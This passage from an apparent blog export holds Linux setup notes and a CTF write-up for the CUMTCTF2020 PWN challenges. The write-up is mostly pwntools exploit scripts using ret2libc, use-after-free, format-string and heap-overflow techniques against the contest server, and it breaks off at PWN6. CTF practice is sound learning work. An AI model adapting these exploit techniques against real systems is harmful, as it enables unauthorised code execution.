<td>vserver</td>\n<td>236</td>\n<td>mbind</td>\n<td>237</td>\n</tr>\n<tr>\n<td>set_mempolicy</td>\n<td>238</td>\n<td>get_mempolicy</td>\n<td>239</td>\n</tr>\n<tr>\n<td>mq_open</td>\n<td>240</td>\n<td>mq_unlink</td>\n<td>241</td>\n</tr>\n<tr>\n<td>mq_timedsend</td>\n<td>242</td>\n<td>mq_timedreceive</td>\n<td>243</td>\n</tr>\n<tr>\n<td>mq_notify</td>\n<td>244</td>\n<td>mq_getsetattr</td>\n<td>245</td>\n</tr>\n<tr>\n<td>kexec_load</td>\n<td>246</td>\n<td>waitid</td>\n<td>247</td>\n</tr>\n<tr>\n<td>add_key</td>\n<td>248</td>\n<td>request_key</td>\n<td>249</td>\n</tr>\n<tr>\n<td>keyctl</td>\n<td>250</td>\n<td>ioprio_set</td>\n<td>251</td>\n</tr>\n<tr>\n<td>ioprio_get</td>\n<td>252</td>\n<td>inotify_init</td>\n<td>253</td>\n</tr>\n<tr>\n<td>inotify_add_watch</td>\n<td>254</td>\n<td>inotify_rm_watch</td>\n<td>255</td>\n</tr>\n<tr>\n<td>migrate_pages</td>\n<td>256</td>\n<td>openat</td>\n<td>257</td>\n</tr>\n<tr>\n<td>mkdirat</td>\n<td>258</td>\n<td>mknodat</td>\n<td>259</td>\n</tr>\n<tr>\n<td>fchownat</td>\n<td>260</td>\n<td>futimesat</td>\n<td>261</td>\n</tr>\n<tr>\n<td>newfstatat</td>\n<td>262</td>\n<td>unlinkat</td>\n<td>263</td>\n</tr>\n<tr>\n<td>renameat</td>\n<td>264</td>\n<td>linkat</td>\n<td>265</td>\n</tr>\n<tr>\n<td>symlinkat</td>\n<td>266</td>\n<td>readlinkat</td>\n<td>267</td>\n</tr>\n<tr>\n<td>fchmodat</td>\n<td>268</td>\n<td>faccessat</td>\n<td>269</td>\n</tr>\n<tr>\n<td>pselect6</td>\n<td>270</td>\n<td>ppoll</td>\n<td>271</td>\n</tr>\n<tr>\n<td>unshare</td>\n<td>272</td>\n<td>set_robust_list</td>\n<td>273</td>\n</tr>\n<tr>\n<td>get_robust_list</td>\n<td>274</td>\n<td>splice</td>\n<td>275</td>\n</tr>\n<tr>\n<td>tee</td>\n<td>276</td>\n<td>sync_file_range</td>\n<td>277</td>\n</tr>\n<tr>\n<td>vmsplice</td>\n<td>278</td>\n<td>move_pages</td>\n<td>279</td>\n</tr>\n<tr>\n<td>utimensat</td>\n<td>280</td>\n<td>epoll_pwait</td>\n<td>281</td>\n</tr>\n<tr>\n<td>signalfd</td>\n<td>282</td>\n<td>timerfd_create</td>\n<td>283</td>\n</tr>\n<tr>\n<td>eventfd</td>\n<td>284</td>\n<td>fallocate</td>\n<td>285</td>\n</tr>\n<tr>\n<td>timerfd_settime</td>\n<td>286</td>\n<td>timerfd_gettime</td>\n<td>287</td>\n</tr>\n<tr>\n<td>accept4</td>\n<td>288</td>\n<td>signalfd4</td>\n<td>289</td>\n</tr>\n<tr>\n<td>eventfd2</td>\n<td>290</td>\n<td>epoll_create1</td>\n<td>291</td>\n</tr>\n<tr>\n<td>dup3</td>\n<td>292</td>\n<td>pipe2</td>\n<td>293</td>\n</tr>\n<tr>\n<td>inotify_init1</td>\n<td>294</td>\n<td>preadv</td>\n<td>295</td>\n</tr>\n<tr>\n<td>pwritev</td>\n<td>296</td>\n<td>rt_tgsigqueueinfo</td>\n<td>297</td>\n</tr>\n<tr>\n<td>perf_event_open</td>\n<td>298</td>\n<td>recvmmsg</td>\n<td>299</td>\n</tr>\n<tr>\n<td>fanotify_init</td>\n<td>300</td>\n<td>fanotify_mark</td>\n<td>301</td>\n</tr>\n<tr>\n<td>prlimit64</td>\n<td>302</td>\n<td>name_to_handle_at</td>\n<td>303</td>\n</tr>\n<tr>\n<td>open_by_handle_at</td>\n<td>304</td>\n<td>clock_adjtime</td>\n<td>305</td>\n</tr>\n<tr>\n<td>syncfs</td>\n<td>306</td>\n<td>sendmmsg</td>\n<td>307</td>\n</tr>\n<tr>\n<td>set_ns</td>\n<td>308</td>\n<td>get_cpu</td>\n<td>309</td>\n</tr>\n<tr>\n<td>process_vm_readv</td>\n<td>310</td>\n<td>process_vm_writev</td>\n<td>311</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h2 id=\"3-git提交\"><a href=\"#3-git提交\" class=\"headerlink\" title=\"3.git提交\"></a>3.git提交</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add *</span><br><span class=\"line\">git remote add origin git@github.com:Pz1o&#x2F;My-PWN.git</span><br><span class=\"line\"></span><br><span class=\"line\">git pull --rebase origin master</span><br><span class=\"line\">git push -u origin master</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-zsh安装\"><a href=\"#4-zsh安装\" class=\"headerlink\" title=\"4.zsh安装\"></a>4.zsh安装</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git -y &amp;&amp; git clone https:&#x2F;&#x2F;gitee.com&#x2F;JonahXie&#x2F;oh-my-zsh.git &amp;&amp; .&#x2F;oh-my-zsh&#x2F;tools&#x2F;install.sh</span><br><span class=\"line\">&#x2F;&#x2F;之后会安装install.sh</span><br><span class=\"line\">&#x2F;&#x2F;建议这里换成 https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;robbyrussell&#x2F;oh-my-zsh.git</span><br><span class=\"line\">&#x2F;&#x2F;之后就是换皮和加插件了</span><br><span class=\"line\"></span><br><span class=\"line\">vim .&#x2F;.zshrc</span><br><span class=\"line\">plugins&#x3D;(git</span><br><span class=\"line\">zsh-autosuggestions</span><br><span class=\"line\">zsh-syntax-highlighting</span><br><span class=\"line\">)</span><br><span class=\"line\">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-autosuggestions</span><br><span class=\"line\">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git &#x2F;home&#x2F;ubuntu&#x2F;oh-my-zsh&#x2F;custom&#x2F;plugins&#x2F;zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;如果想用agnoster</span><br><span class=\"line\">sudo apt-get install fonts-powerline</span><br><span class=\"line\">&#x2F;&#x2F;这边建议用random</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-宝塔问题\"><a href=\"#5-宝塔问题\" class=\"headerlink\" title=\"5.宝塔问题\"></a>5.宝塔问题</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo &#x2F;etc&#x2F;init.d&#x2F;bt default</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-directorylister\"><a href=\"#6-directorylister\" class=\"headerlink\" title=\"6.directorylister\"></a>6.directorylister</h2><p>先安装php7.2</p>\n<p>直接上宝塔安装就可以</p>\n<p>然后上[网站][<a href=\"https://www.directorylister.com/]下载解压\" target=\"_blank\" rel=\"noopener\">https://www.directorylister.com/]下载解压</a></p>\n<p>根据这篇[文章][<a href=\"https://blog.chrxw.com/archives/2020/09/21/1401.html]来就可以\" target=\"_blank\" rel=\"noopener\">https://blog.chrxw.com/archives/2020/09/21/1401.html]来就可以</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">opcache</span><br><span class=\"line\">&#x2F;&#x2F;这个扩展得下载</span><br></pre></td></tr></table></figure>\n<h2 id><a href=\"#\" class=\"headerlink\" title=\" \"></a> </h2>","categories":["linux"],"tags":["others"]},{"title":"CUMTCTF2020岁末赛","url":"https://pz1o.top/2020/12/26/CUMTCTF2020岁末赛/","content":"<h1 id=\"CUMTCTF2020岁末赛\"><a href=\"#CUMTCTF2020岁末赛\" class=\"headerlink\" title=\"CUMTCTF2020岁末赛\"></a>CUMTCTF2020岁末赛</h1><p>学长们可太搞了，比赛最后垂直上分可太秀了</p>\n<p><img src=\"/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png\" alt=\"image-20201226220723157\"></p>\n<p>只放PWN的题解了</p>\n<p>下面几个题先放题解，等期末考完试来复现</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"PWN1\"><a href=\"#PWN1\" class=\"headerlink\" title=\"PWN1\"></a>PWN1</h2><p>\\x00截断</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn1\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b\"\\x00\"</span>*<span class=\"number\">7</span> + p32(<span class=\"number\">123</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN2\"><a href=\"#PWN2\" class=\"headerlink\" title=\"PWN2\"></a>PWN2</h2><p>在1的基础上puts泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn2\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn2'</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context(arch=\"i386\",os=\"linux\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">'\\x00'</span>*<span class=\"number\">7</span> + <span class=\"string\">'\\xff'</span></span><br><span class=\"line\">r.sendline(payload1)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"you_really_know_random_haha\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">put_plt = elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">put_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x80486D3</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x6c</span>+<span class=\"number\">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class=\"line\">r.sendline(payload2)</span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">put = u32(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\">print(hex(put))</span><br><span class=\"line\"><span class=\"comment\">#libc = LibcSearcher('puts',put)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = put - libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system = libcbase + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">print(hex(binsh))</span><br><span class=\"line\">sh = libcbase + binsh</span><br><span class=\"line\">payload1 = <span class=\"string\">b'\\x00'</span>*<span class=\"number\">7</span> + <span class=\"string\">b'\\xff'</span></span><br><span class=\"line\">r.sendline(payload1)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"you_really_know_random_haha\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">payload3 = <span class=\"string\">b\"A\"</span>*(<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(system) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload3)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN3\"><a href=\"#PWN3\" class=\"headerlink\" title=\"PWN3\"></a>PWN3</h2><p>UAF</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"219.219.61.234\",10002)</span></span><br><span class=\"line\">r = process(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"AAAA\"</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">\"BBBB\"</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic))</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN4-fail\"><a href=\"#PWN4-fail\" class=\"headerlink\" title=\"PWN4(fail)\"></a>PWN4(fail)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">'./pwn4'</span>)</span><br><span class=\"line\">sh = remote(<span class=\"string\">'219.219.61.234'</span>,<span class=\"string\">'10003'</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>,os=<span class=\"string\">'linux'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn4'</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">key = <span class=\"string\">'3xpL0r3R'</span></span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(str(key))</span><br><span class=\"line\">payload = <span class=\"string\">'aaaa%77$p'</span><span class=\"comment\">#6</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'aaaa0x'</span>)</span><br><span class=\"line\">libc_base = int(int(sh.recv(<span class=\"number\">12</span>),<span class=\"number\">16</span>) - <span class=\"number\">0x20840</span>)</span><br><span class=\"line\">log.success(hex(libc_base))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">puts_addr = libc_base + libc.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">log.success(hex(puts_addr))</span><br><span class=\"line\">gad_get = [<span class=\"number\">0x45226</span>,<span class=\"number\">0x4527a</span>,<span class=\"number\">0xf0364</span>,<span class=\"number\">0xf1207</span>]</span><br><span class=\"line\">one_addr = libc_base + gad_get[<span class=\"number\">0</span>]</span><br><span class=\"line\">log.success(hex(one_addr))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN5-fail\"><a href=\"#PWN5-fail\" class=\"headerlink\" title=\"PWN5(fail)\"></a>PWN5(fail)</h2><p>淦 这个题我以为给的libc就能用 没想到用的是本机的libc简直血亏</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10004</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn5\")</span></span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn5'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = 'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\": \"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content: \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"OK!\"</span>)</span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">print(hex(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r)</span></span><br><span class=\"line\"><span class=\"comment\">#print(hex(heap.got['free']))</span></span><br><span class=\"line\"><span class=\"comment\">#add(0x10,\"/bin/sh\\x00\")</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#delete(2)</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#delete(1)</span></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"PWN6-fail\"><a href=\"#PWN6-fail\" class=\"headerlink\" title=\"PWN6(fail)\"></a>PWN6(fail)</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 